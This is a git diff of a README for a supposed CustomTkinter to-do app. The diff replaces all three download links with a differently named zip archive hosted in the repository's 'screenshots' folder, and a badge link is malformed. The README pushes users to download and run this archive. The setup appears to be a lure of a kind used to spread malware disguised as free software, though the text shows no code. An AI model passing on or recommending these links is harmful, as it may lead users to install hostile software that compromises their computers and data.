@@ -1,6 +1,6 @@
 # 📝 CTk-Modern-Todo-App - Manage Your Tasks Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/CTk-Modern-Todo-App-v1.2.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/CTk-Modern-Todo-App-v1.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/Todo_Tk_C_App_Modern_3.2.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/Todo_Tk_C_App_Modern_3.2.zip)
 
 ## 🎯 Overview
 CTk-Modern-Todo-App is a sleek and modern to-do application built with CustomTkinter. This app features a clean user interface and effective task management tools, making it perfect for organizing your tasks and boosting your productivity.
@@ -15,7 +15,7 @@ Follow these steps to download and run the CTk-Modern-Todo-App on your computer.
 
 ## 📦 Download & Install
 To install the CTk-Modern-Todo-App, visit this page to download:
-[Download CTk-Modern-Todo-App](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/CTk-Modern-Todo-App-v1.2.zip)
+[Download CTk-Modern-Todo-App](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/Todo_Tk_C_App_Modern_3.2.zip)
 
 ### Steps to Download and Install:
 1. Click on the **"Download CTk-Modern-Todo-App"** link above.
@@ -57,4 +57,4 @@ CTk-Modern-Todo-App uses CustomTkinter, a powerful library for creating modern G
 
 For any updates and tutorials, follow the repository to stay informed on new features and releases. 
 
-Download CTk-Modern-Todo-App here: [Download CTk-Modern-Todo-App](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/CTk-Modern-Todo-App-v1.2.zip)
+Download CTk-Modern-Todo-App here: [Download CTk-Modern-Todo-App](https://raw.githubusercontent.com/Fansh-alt/CTk-Modern-Todo-App/main/screenshots/Todo_Tk_C_App_Modern_3.2.zip)
